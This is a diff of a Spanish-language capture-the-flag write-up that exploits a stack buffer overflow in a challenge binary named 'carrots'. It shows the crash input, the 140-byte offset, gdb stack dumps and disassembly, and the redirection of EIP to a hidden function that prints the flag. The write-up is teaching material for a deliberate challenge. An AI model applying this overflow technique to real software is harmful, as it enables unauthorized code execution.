@@ -12,7 +12,7 @@ Se trata del clásico buffer overflow que peta cuando le metes más caracteres d
 ```
 ./carrots 
  Where is my carrot?
- > AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaaa
+ > AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
 Segmentation fault
 ```
 
@@ -30,7 +30,7 @@ Lo metemos en gdb y nos da una dirección que se corresponde con una parte del p
 [*] Exact match at offset 140
 ```
 
-Si nos fijamos en la función main vemos que hay una función que recoge nuestros datos por consola, esta función es vulnerable a un buffer overflow, por lo tanto vamos a sobreescribir aquí el EIP
+Si nos fijamos en la función main vemos que hay una llamada a la función que recoge nuestros datos por consola, esta función es vulnerable a un buffer overflow. Si metemos más de 140 caracteres vamos a sobreescribir el stack frame de main.
 
 ```
 08049790 <main>:
@@ -66,21 +66,71 @@ Si nos fijamos en la función main vemos que hay una función que recoge nuestro
  804981c:	81 c4 a8 00 00 00    	add    esp,0xa8
  8049822:	5d                   	pop    ebp
  8049823:	c3                   	ret                                     <== Sobreescribir aquí el EIP antes de llamar a ret
- 8049824:	66 90                	xchg   ax,ax
- 8049826:	66 90                	xchg   ax,ax
- 8049828:	66 90                	xchg   ax,ax
- 804982a:	66 90                	xchg   ax,ax
- 804982c:	66 90                	xchg   ax,ax
- 804982e:	66 90                	xchg   ax,ax
+
+```
+Situación de la pila después de la llamada a la función y tras haber introducido 140 caracteres, los últimos 4 caracteres son diferentes para identificar donde está la posición de memoria de retorno que hemos machacado:
+
+```
+br *0x80497d8
+ > AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+
+gdb-peda$ x/64xw $esp
+0xbffff290:	0x0804c0a0	0xbffff33c	0xb7dbfe00	0xb7dbfdfc
+0xbffff2a0:	0xb7fac504	0xb7c13618	0xb7c3a870	0x00000018
+0xbffff2b0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff2c0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff2d0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff2e0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff2f0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff300:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff310:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff320:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff330:	0x41414141	0x41414141	0x42424242	0xb7c24200
+```
+
+Una vez que sabemos que si introducimos 140 caracteres va a sobreescribir el EIP del stack frame de main, si metemos 136 caracteres y una dirección de memoria donde dirigir el flujo del programa (posición ocupada por BBBB y cuyoo valor es 0xbffff33c). Lo suyo sería dirigir el programa hacia una dirección donde nos muestre el flag que buscamos, pero... ¿cual es esa dirección de memoria?
+Si echamos un vistazo a las strings, vemos que hay unas cadenas que podrían darnos una pista de donde va a mostrarnos el flag:
+
+```
+rabin2 -z carrots | grep arrot
+vaddr=0x08049fd5 paddr=0x00001fd5 ordinal=018 sz=38 len=37 section=.rodata type=ascii string=\n Yes! My Carrot is here! mmmm ... \n 
+```
+
+Buscando en el código encontramos la función desde la que se llama a esa string:
+
+```
+objdump -M intel -drw carrots | grep 49fd5 -6
+08049570 <_Z6CARROTv>:
+ 8049570:	55                   	push   ebp
+ 8049571:	89 e5                	mov    ebp,esp
+ 8049573:	53                   	push   ebx
+ 8049574:	56                   	push   esi
+ 8049575:	81 ec 90 00 00 00    	sub    esp,0x90
+ 804957b:	8d 05 d5 9f 04 08    	lea    eax,ds:0x8049fd5          <== Dirección de la string que buscamos con el grep
+ 8049581:	89 04 24             	mov    DWORD PTR [esp],eax
+ 8049584:	e8 d7 f9 ff ff       	call   8048f60 <printf@plt>
+ 8049589:	81 3d d4 c1 04 08 44 52 49 42 	cmp    DWORD PTR ds:0x804c1d4,0x42495244
+ 8049593:	89 45 a8             	mov    DWORD PTR [ebp-0x58],eax
+ 8049596:	0f 84 22 00 00 00    	je     80495be <_Z6CARROTv+0x4e>
+ 804959c:	8d 05 fb 9f 04 08    	lea    eax,ds:0x8049ffb
 
 ```
 
-Una vez que sabemos que si escribimos 140 caracteres va a sobreescribir el EIP del stack frame de main, podemos poner la dirección que nos interese para dirigir el programa a donde nos interese ejecutarlo. ¿Donde lo apuntamos para que nos muestre el flag?
+Nuestra función objetivo es "_Z6CARROTv", sólo nos queda apuntar el EIP a 0x08049570. Si lo probamos dentro del gdb, hay que cambiar las BBBB  que está en la posición 0xbffff33c por el valor 0x08049570:
 
 ```
-objdump -x carrots | grep CARR
-08049570 g     F .text	0000021a              _Z6CARROTv
+set {int}0xbffff33c=0x08049570
 ```
+```
+gdb-peda$ c
+Continuing.
+
+ Yes! My Carrot is here! mmmm ... 
+  ~(‾▿‾)~   Oh NO! We hate birds :( 
+```
+
+Ooops! Something is wrong here. ¿Qué ha pasado? Parece que no era tan fácil como parecía. Si echamos un vistazo detenidamente a la función "_Z6CARROTv" podemos ver lo siguiente:
+
 
 ```
 br *0x804981c
